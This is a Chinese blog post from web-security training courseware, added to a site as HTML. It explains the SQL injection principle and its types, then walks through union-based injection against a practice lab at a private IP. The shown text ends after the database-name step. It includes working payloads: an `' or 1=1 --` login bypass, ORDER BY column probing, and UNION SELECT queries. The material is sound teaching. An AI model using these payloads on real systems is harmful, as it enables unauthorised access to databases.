@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="day2-web安全基础一（上午：SQL注入、XSS、SSRF）原理SQL注入这种攻击方式中，恶意代码被插入到字符串中，然后该字符串传递到SQL Server的实例以进行分析和执行。任何构成SQL语句的过程都应进行注入检查，因为SQL Server将执行其接收到的所有语法有效的查询。 注入攻击的本质，是把用户输入的数据当做代码执行。 这里有两个关键条件： 第一个是用户能够控制输入 第二个是原本程序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="day2-web安全基础一（上午：SQL注入、XSS、SSRF）">
+<meta property="og:url" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="day2-web安全基础一（上午：SQL注入、XSS、SSRF）原理SQL注入这种攻击方式中，恶意代码被插入到字符串中，然后该字符串传递到SQL Server的实例以进行分析和执行。任何构成SQL语句的过程都应进行注入检查，因为SQL Server将执行其接收到的所有语法有效的查询。 注入攻击的本质，是把用户输入的数据当做代码执行。 这里有两个关键条件： 第一个是用户能够控制输入 第二个是原本程序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/DaxH23T5vQuc7bDe0wA08Fe5I0LzcfG_M1PKWXbQAys.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/qTAYJouyalqoXq3TdJ_823_VdOcYUjwm-668dxnvSZU.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/bJz56QHKef4bLlGNWMtIovOUJC9-0fmqqhZRxfMNoLk.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/stmHs2VBJNWNkfcZtVIAI8WBQw7We10gT_c-pj99wdg.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/TpoKiaIgan3Egen16em7AVDy6ng_i3rt-o7_FioNrjQ.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/rG-5cSrnPP5TzKEyKVRfBxbMOELQ_6vyiC2qXIhpo3c.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/9laWhqETZqINvqYexcIVReJgiim3dtBL0_jdu4xBJsI.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/W0cWHdNBZeUlGrJfBbb8Aa1hKcsQX0BKaT4K5_qqs5U.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/t2vm7gF97GAbYzNEHB4ZfiCk9vwda-lf8V4k1b7Aog8.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/H3nwV5ZBF9dqzGBDqWYhruOgn6vfCwBVFFrKxtyppmA.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/bMc3wKAtVu0r_JuUANbeBwn6Hs0ewMx10JiQ--IKgWY.png">
+<meta property="og:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/Ws4tg0f8nMdWIS3xf0qcgxPkt4gyU0Ua0fZ6AZydCiQ.png">
+<meta property="article:published_time" content="2022-08-16T13:40:49.000Z">
+<meta property="article:modified_time" content="2023-05-29T13:20:17.246Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/DaxH23T5vQuc7bDe0wA08Fe5I0LzcfG_M1PKWXbQAys.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>day2-web安全基础一（上午：SQL注入、XSS、SSRF）</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/08/16/day1-HW%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%88%99%E4%BB%8B%E7%BB%8D%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/08/16/day3-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9AXXE%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&text=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&is_video=false&description=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day2-web安全基础一（上午：SQL注入、XSS、SSRF）&body=Check out this article: https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&title=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&name=day2-web安全基础一（上午：SQL注入、XSS、SSRF）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89/&t=day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day2-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day2-web安全基础一（上午：SQL注入、XSS、SSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.0.2.</span> <span class="toc-text">SQL 注入的分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">1.0.3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">正常</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E6%98%BE%E4%BD%8D"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">找显位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-number">1.0.3.5.</span> <span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.3.6.</span> <span class="toc-text">表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%88%90"><span class="toc-number">1.0.3.7.</span> <span class="toc-text">注入完成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.0.3.8.</span> <span class="toc-text">练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.4.</span> <span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.5.</span> <span class="toc-text">常用利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.6.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E8%84%9A%E6%9C%AC%E5%88%86%E4%B8%BA%E4%B8%8B%E9%9D%A2%E4%B8%89%E7%B1%BB"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS 脚本分为下面三类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.3.</span> <span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.4.</span> <span class="toc-text">常用利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.1.5.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理以及危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.2.2.</span> <span class="toc-text">挖掘方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.2.3.</span> <span class="toc-text">常用利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.2.4.</span> <span class="toc-text">修复方法</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        day2-web安全基础一（上午：SQL注入、XSS、SSRF）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-16T13:40:49.000Z" class="dt-published" itemprop="datePublished">2022-08-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%9F%B9%E8%AE%AD%E8%AF%BE%E4%BB%B6/">原创培训课件</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="day2-web安全基础一（上午：SQL注入、XSS、SSRF）"><a href="#day2-web安全基础一（上午：SQL注入、XSS、SSRF）" class="headerlink" title="day2-web安全基础一（上午：SQL注入、XSS、SSRF）"></a>day2-web安全基础一（上午：SQL注入、XSS、SSRF）</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入这种攻击方式中，恶意代码被插入到字符串中，然后该字符串传递到SQL Server的实例以进行分析和执行。任何构成SQL语句的过程都应进行注入检查，因为SQL Server将执行其接收到的所有语法有效的查询。</p>
+<p>注入攻击的本质，是把用户输入的数据当做代码执行。</p>
+<p>这里有两个关键条件：</p>
+<p>第一个是用户能够控制输入</p>
+<p>第二个是原本程序要执行的代码，拼接了用户输入的数据</p>
+<p>危害：拖数据、写shell（特定情况下），获取管理员的账号密码等</p>
+<p>SQL 注入原理演示</p>
+<p>用户登录的基本 SQL 语句： </p>
+<p>select * from users where username &#x3D; ‘用户输入的用户名’ and password &#x3D; ‘用户输入的密码’ </p>
+<p>用户输入的内容是可控的，例如我们可以在用户名中输入’ or 1&#x3D;1 –空格 </p>
+<p>select * from users where username &#x3D; ‘’ or 1&#x3D;1 –空格 ‘and password &#x3D; ‘用户输入的密码’ </p>
+<p>此时我们输入的第一个单引号将 username 的单引号闭合，相当于输入了一个空用户，</p>
+<p>or 表示左右 两边只要有一边条件判断成立则该语句返回结果为真，其中 1&#x3D;1 永远为真，所以当前 SQL 诧句无论怎么 执行结果永远为真，–空格表示注释，注释后面所有代码不再执行。 </p>
+<p>我们可以看到上面我们闭合的方法是没有输入用户名的，所以并不能成功登陆</p>
+<p> select * from users where username &#x3D; ‘admin’ or 1&#x3D;1 –空格 ‘and password &#x3D; ‘用户输入的 密码’ </p>
+<p>我们在单引号前面加上用户名表示我们要登陆的用户。这样就成功绕过了用户密码认证。 </p>
+<p>单引号的作用： 在提交数据或者 URL 中添加单引号进行提交如果返回 SQL 错误即可判断当前位置存在 SQL 注入漏洞。 原因是没有被过滤。 </p>
+<h3 id="SQL-注入的分类"><a href="#SQL-注入的分类" class="headerlink" title="SQL 注入的分类"></a>SQL 注入的分类</h3><p>SQL 注入的分类基本上都是根据在注入的方式进行分类，</p>
+<p>大概分为以下 4 类 </p>
+<p>1、布尔注入：可以根据返回页面判断条件真假的注入；</p>
+<p> 2、联合注入：可以使用 union 的注入； </p>
+<p>3、延迟注入：不能根据页面返回内容判断任何信息，用条件 语句查看时间延迟语句是否执行（即页面 返回时间是否增加）来判断； </p>
+<p>4、报错注入：页面会返回错诨信息，或者把注入的   语句的结果直接返回在页面中； 以上是根据常见的注入方式进行分类，但是通常杢说 SQL 注入只分为字符型戒者数字型比如： 数字型 1 or 1&#x3D;1 字符型 1’ or ‘1’&#x3D;’1</p>
+<p>5、宽字节等</p>
+<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>sqli_x.php  </p>
+<h4 id="正常"><a href="#正常" class="headerlink" title="正常"></a>正常</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>
+<p><img src="DaxH23T5vQuc7bDe0wA08Fe5I0LzcfG_M1PKWXbQAys.png" alt="image"></p>
+<p>参数说明： ？表示传递参数，通常都是在页面后会有？name&#x3D;用户，这样的方式传递参数给服务器，然后给我们返回参数对应的页面信息</p>
+<h4 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h4><p>添加了一个单引号之后，发现了报错。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?name=1&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span></span><br></pre></td></tr></table></figure>
+<p><img src="qTAYJouyalqoXq3TdJ_823_VdOcYUjwm-668dxnvSZU.png" alt="image"></p>
+<h4 id="找显位"><a href="#找显位" class="headerlink" title="找显位"></a>找显位</h4><p>ORDER BY 关键词用亍对记录集中的数据进行排序。 </p>
+<p>用法 1：按某个字段进行排序： </p>
+<p>语法：select 字段 1，字段 2 from 表名 order by 字段名; </p>
+<p>用法 2：按第几个字段进行排序，如果超过表中的字段数，就报错 </p>
+<p>语法：select 字段 1，字段 2 from 表名 order by 数字;</p>
+<p>3的时候不正常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20order%20by%203--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="bJz56QHKef4bLlGNWMtIovOUJC9-0fmqqhZRxfMNoLk.png" alt="image"></p>
+<p>2的时候正常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20order%20by%202--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="stmHs2VBJNWNkfcZtVIAI8WBQw7We10gT_c-pj99wdg.png" alt="image"></p>
+<p>说明这个查询语句中，就查询了两个字段的内容而已。</p>
+<p>查找显示的位置。</p>
+<h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><p>union：用于合并两个或多个select语句的结果集，并消去表中任何重复行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select id,sex from member <span class="type">where</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">2</span> union select <span class="number">1</span>,version();</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,version()--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="TpoKiaIgan3Egen16em7AVDy6ng_i3rt-o7_FioNrjQ.png" alt="image"></p>
+<p><img src="rG-5cSrnPP5TzKEyKVRfBxbMOELQ_6vyiC2qXIhpo3c.png" alt="image"></p>
+<h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.88.104:8088/vul/sqli/sqli_str.php?submit=%E6%9F%A5%E8%AF%A2&amp;name=2%27%20union%20select%201,database()--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="9laWhqETZqINvqYexcIVReJgiim3dtBL0_jdu4xBJsI.png" alt="image"></p>
